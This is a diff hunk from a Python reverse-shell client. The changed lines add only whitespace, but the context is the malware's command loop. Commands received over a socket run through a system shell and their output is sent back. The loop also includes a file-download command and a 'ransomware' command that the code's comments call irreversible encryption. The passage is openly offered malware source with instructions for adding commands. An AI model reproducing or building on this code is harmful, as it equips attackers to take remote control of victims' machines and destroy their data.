@@ -43,9 +43,11 @@ while True:
     if cmd.lower() in ['q', 'quit', 'x', 'exit']:
         break
 
+
     if cmd.lower() in ['h', 'help']:
         sys.stderr = object
         continue
+
 
     # This will close the connection because tcp doesnt know when the end of the file is reached so it keeps waiting for data which means the shell cannot be used anymore and it has to be killed
     if cmd.lower() in ['down', 'download']:
@@ -70,6 +72,7 @@ while True:
             sys.stderr = object
         elif yesNo == 'n':
             continue
+
 
     # The encryption cannot be reverted
     if cmd.lower() in ['rw', 'encrypt', 'ransomware']:
@@ -124,19 +127,24 @@ while True:
             s.send('Ecnryption successful...'.encode())
             sys.stderr = object
         
+
     # To add your own command remove the # below and change alias with the command alias and command with the command name
     # Make sure to add it to RevShellServer.py as well
     # if cmd.lower() in ['alias', 'command']:
         # s.send(varName.encode())
+
 
     try:
         result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
     except Exception as e:
         result = str(e).encode()
 
+
     if len(result) == 0:
         result = 'OK'.encode()
 
+
     s.send(result)
+
 
 s.close()
